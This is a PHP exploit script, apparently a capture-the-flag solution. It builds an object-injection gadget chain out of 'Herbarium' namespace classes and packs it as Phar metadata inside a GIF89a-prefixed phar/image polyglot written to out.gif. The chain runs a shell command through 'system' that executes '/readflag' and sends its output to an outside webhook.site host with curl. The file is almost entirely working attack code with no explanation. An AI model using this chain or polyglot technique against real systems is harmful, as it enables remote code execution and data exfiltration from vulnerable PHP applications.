<?php

namespace Herbarium\Import {

    class ImportPipeline {
        protected array $components;
        protected array $results = [];

        public function __construct($reg)
        {
            $this->components = [&$reg, 'resolve', &$this->results];
        }
    }

    class ImportPipelineRegistry {
        protected $ALLOWED_PROCESSORS;
        protected $processors;
        protected $config;
        protected $context;
        protected $pipeline;

        public function __construct()
        {
            $ip = new ImportPipeline($this);

            $this->ALLOWED_PROCESSORS = ['Herbarium\\Core\\ResourceHandle', 'Herbarium\\Core\\MiddlewareStack'];
            $this->processors         = ['common_name' => 'Herbarium\\Core\\ResourceHandle', 'result' => 'Herbarium\\Core\\MiddlewareStack'];
            $this->config             = ['close' => $ip, 'system'];
            $this->context            = 'curl -d x=$(/readflag) https://webhook.site/2d363a6d-5b5d-4c39-82c8-188e7fe121bb';
            $this->pipeline           = $ip;
        }
    }
}

namespace Herbarium\Specimens {
    class SpecimenCollector {
        protected $specimens;
        protected $importedBy;
        protected $source;

        public function __construct(&$reg)
        {
            $this->specimens  = [&$reg];
            $this->importedBy = 1;
            $this->source     = 'x';
        }
    }
}

namespace {
    $reg = new \Herbarium\Import\ImportPipelineRegistry();

    $payload = new \Herbarium\Specimens\SpecimenCollector($reg);

    function generate_phar_polyglot($o, $prefix){
        global $tempname;
        @unlink($tempname);
        $phar = new Phar($tempname);
        $phar->startBuffering();
        $phar->addFromString("test.txt", "test");
        $phar->setStub($prefix . '<?php __HALT_COMPILER(); ?>');
        $phar->setMetadata($o);
        $phar->stopBuffering();

        $content = file_get_contents($tempname);
        @unlink($tempname);
        return $content;
    }

    $tempname = tempnam(sys_get_temp_dir(), 'phar') . '.phar';
    $prefix = "GIF89a";
    $outfile = 'out.gif';

    file_put_contents($outfile, generate_phar_polyglot($payload, $prefix));
}
